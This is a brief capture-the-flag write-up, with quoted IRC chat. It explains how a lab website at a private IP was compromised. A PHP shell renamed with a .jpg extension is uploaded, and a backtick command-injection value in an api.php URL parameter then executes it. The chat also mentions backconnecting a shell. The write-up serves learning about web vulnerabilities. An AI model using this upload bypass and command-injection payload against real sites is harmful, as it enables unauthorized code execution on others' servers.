## Write-up

```
13:41:38 <ccm> sigsegv, remote command execution on second server which can be used to execute a script in the shared uploads folder and backconnect to your machine
13:41:55 <@Andrei> <ccm> gnomus, basically: http://ip/api.php?apikey=bla&type=wc&file=`php uploads/sploit.jpg`
13:41:55 <@Andrei> <fox> gnomus, also the rce was triggerable only with a curl from the first box
```

The website at `http://10.13.37.89/` contains a form that allows file uploads. Files are uploaded to the `uploads` directory, but only files with safe extensions are allowed.


The trick was to create a PHP shell e.g. `shell.php`, rename it to `shell.jpg`, then upload it.

There was a second vulnerability in the website that allowed remote code execution

http://10.13.37.89/api.php?apikey=bla&type=wc&file=`php uploads/shell.jpg`
